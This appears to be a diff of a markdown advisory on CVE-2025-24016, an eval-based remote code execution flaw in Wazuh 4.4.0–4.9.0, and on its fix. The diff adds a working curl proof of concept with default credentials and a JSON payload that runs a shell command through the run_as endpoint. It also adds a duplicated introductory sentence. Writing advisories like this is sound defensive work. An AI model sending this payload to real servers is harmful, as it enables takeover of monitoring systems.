@@ -18,6 +18,7 @@ Open-source Security Information and Event Management (SIEM) platform Wazuh suff
 Attackers who have API access can execute arbitrary Python commands on vulnerable servers through this vulnerability, which exists from version 4.4.0 up to 4.9.0. The `as_wazuh_object` function processes DistributedAPI (DAPI) request or response data that makes the vulnerability active. The vulnerability enables attackers to execute arbitrary Python code, resulting in system takeover, data breaches, and complete security damage to infrastructure.
 
 The safe `ast.literal_eval` function change in version 4.9.1 enables vulnerability protection.
+Open-source Security Information and Event Management (SIEM) platform Wazuh suffers from CVE-2025-24016 which enables attackers to execute arbitrary code remotely on their servers.
 
 ## Technical Breakdown
 
@@ -33,7 +34,8 @@ The safe `ast.literal_eval` function change in version 4.9.1 enables vulnerabili
 
 The security problem resides inside the `as_wazuh_object` function within `framework/wazuh/core/cluster/common.py`. DAPI data serialization occurs through this function to process JSON data used for communication between Wazuh API, manager, and agents.
 
-### Vulnerable Code
+Before the implementation of the security patch the vulnerable code section appeared as follows:
+
 ```python
 def as_wazuh_object(dct: Dict):
     try:
@@ -50,9 +52,10 @@ def as_wazuh_object(dct: Dict):
 The code checks if the dictionary `dct` contains the key `__unhandled_exc__`. A valid dictionary value for `__unhandled_exc__` enables the code to obtain class and args values before implementing `eval` to create an instance of `__class__` with arguments `__args__`. Evaluating untrusted data means exposing the system to severe Python code execution since attackers control it.
 
 ## Affected Component Analysis
-CVE-2025-24016 occurs because `eval` operates on every data string received from the Distributed API for serialization. Python’s evaluation functions enable arbitrary program execution, creating a major security threat.
+CVE-2025-24016 occurs because `eval` operates on every data string received from the Distributed API for serialization. Evaluation functions in Python enable execution of arbitrary program code so this creates a major security threat to users.
+The vulnerability can be abused by attackers who create specific malicious JSON data including the `unhandled_exc` dictionary entry. A specifically constructed dictionary within the Python class gets passed to the `eval` function allowing server-execution of arbitrary code.
+The vulnerability appears because the `as_wazuh_object` function fails to properly clean or check incoming data before sending it to evaluation. Attackers can execute remote code by placing their own code into the `class` and `args` fields because this vulnerability allows control over these parameters.
 
-### Exploitation Example
 An attacker can send the following JSON payload:
 ```json
 {
@@ -64,12 +67,22 @@ An attacker can send the following JSON payload:
 ```
 The execution of `eval` within `as_wazuh_object` produces a system call of `os.system("touch /tmp/pwn.txt")`, leading to the creation of a file named `/tmp/pwn.txt` on the Wazuh server.
 
-### Proof-of-Concept (PoC) Exploit
+## Exploitation Techniques
+Exploiting this vulnerability requires API access, which attackers can obtain through compromised dashboards, agents, or weak credentials.
+
+A proof-of-concept (PoC) demonstrates how exploitation can be carried out via the run_as endpoint:
 ```sh
 curl -X POST -k -u "wazuh-wui:MyS3cr37P450r.*-" -H "Content-Type: application/json" \  
 --data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["touch /tmp/pwn.txt"]}}' \  
 https://<worker-server>:55000/security/user/authenticate/run_as
 ```
+### Explanation of the Exploit:
+•	`-X POST` – Specifies the HTTP method as POST.
+•	`-k` – Disables SSL certificate verification (useful for testing in environments with self-signed certificates).
+•	`-u "wazuh-wui:MyS3cr37P450r.*-"` – Provides authentication credentials (default credentials are used here, which should be changed for security).
+•	`-H "Content-Type: application/json"` – Sets the `Content-Type` header to `application/json` to indicate the request body format.
+•	`--data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["touch /tmp/pwn.txt"]}}'` – Injects the malicious JSON payload, which executes the command touch /tmp/pwn.txt on the Wazuh server, demonstrating arbitrary code execution.
+•	`https://<worker-server>:55000/security/user/authenticate/run_as` – Specifies the run_as endpoint URL. The placeholder <worker-server> should be replaced with the actual hostname or IP address of the Wazuh worker server.
 
 ### Attack Capabilities
 - **Full system control** – Attackers can install malware, modify configurations, or exfiltrate sensitive data.
@@ -79,7 +92,8 @@ https://<worker-server>:55000/security/user/authenticate/run_as
 ## Patch Analysis
 Wazuh resolved this vulnerability in version 4.9.1 by replacing `eval` with `ast.literal_eval`, which securely evaluates literals without allowing arbitrary code execution.
 
-### Fixed Code
+Here is the relevant code modification in `framework/wazuh/core/cluster/common.py`:
+
 ```python
         elif '__unhandled_exc__' in dct:
             exc_data = dct['__unhandled_exc__']
